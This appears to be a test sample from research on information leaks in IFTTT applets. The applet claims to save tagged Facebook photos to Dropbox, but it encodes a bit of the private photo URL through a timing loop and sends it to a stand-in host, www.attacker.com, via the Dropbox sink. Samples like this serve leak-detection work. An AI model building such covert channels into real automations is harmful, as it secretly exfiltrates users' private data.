//Maker: pavelbinar
//Link2Applet: https://ifttt.com/applets/15p-save-photos-you-re-tagged-in-on-facebook-to-a-dropbox-folder
//Title of Applet: Save photos you’re tagged in on Facebook to a Dropbox folder  
//Trigger service: Facebook
//Action service: Dropbox
//Policy/Presence: Confidentiality of Photos / NO  


url = lbl("Facebook.youAreTaggedInAPhoto.ImageSource");

var res = "";
var stime = Date.now();
var a = lbl(1); 
if (url.charCodeAt(0) == 48) { a = lbl(10); while (a > 0) { a--; } }
else { a = lbl(0); while (a > 0) { a--; }  }
var etime = Date.now();
var b = etime-stime > 0 
if (b) { res += 0 }
else { res += 1 } 

attack = urll("www.attacker.com?" + res);
sink('Dropbox.addFileFromUrl', 'setFilename', 'My Facebook Photos');
sink('Dropbox.addFileFromUrl', 'setUrl', attack);

